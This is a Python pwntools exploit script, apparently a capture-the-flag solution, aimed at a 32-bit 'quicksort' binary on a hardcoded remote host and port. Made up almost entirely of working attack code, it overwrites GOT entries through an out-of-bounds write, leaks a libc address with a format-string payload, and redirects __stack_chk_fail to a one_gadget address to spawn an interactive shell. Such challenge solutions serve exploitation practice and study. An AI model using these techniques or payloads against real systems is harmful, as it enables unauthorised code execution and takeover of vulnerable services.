from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
#context.terminal = ['tmux', 'sp', '-h']
local = 1
if 0:
	p = process('./quicksort')
else:
	p=remote("34.92.96.238",10000)    
elf = ELF('./quicksort')
g = lambda x: next(elf.search(asm(x)))
ret = g('ret') # 0x8048816
puts_plt = elf.plt['puts'] # 0x8048560
puts_got = elf.got['puts'] # 0x804a02c
free_got = elf.got['free'] # 0x804a018
printf = elf.plt['printf'] # 
func = 0x08048816
stack_chk_fail_got = elf.got['__stack_chk_fail']
setbuf_got = elf.got['setbuf']


def write(addr, val, t):
	payload = str(val)
	payload += (0x10 - len(payload)) * '\x00'
	payload += p32(t)
	payload += (0x1C - len(payload)) * '\x00'
	payload += p32(addr)
	p.recvuntil('number:')
	p.sendline(payload)

def overflow(addr, val, t):
	payload = str(val)
	payload += (0x10 - len(payload)) * '\x00'
	payload += p32(t)
	payload += (0x1C - len(payload)) * '\x00'
	payload += p32(addr) + '\x00' * 4
	p.recvuntil('number:')
	p.sendline(payload)
bss=0x0804a000+0x800
p.recvuntil('sort?\n')
t = 2
p.sendline(str(t))
write(free_got, printf, 2)
overflow(stack_chk_fail_got, 0x8048816, 1)

p.recvuntil('sort?\n')
p.sendline(str(t))
overflow(bss, 1881420837, 1)
p.readuntil("37 \n")
base=int(p.read(0xa),16)-(0xf7791000-0xf75df000)
log.warning(hex(base))
#gdb.attach(p, 'b *0x80489bf')
one=0x3ac62+base
p.recvuntil('sort?\n')
p.sendline(str(t))
write(stack_chk_fail_got, one&0xffff, 2)
overflow(stack_chk_fail_got+2, (one&0xffff0000)>>16, 1)


p.interactive()
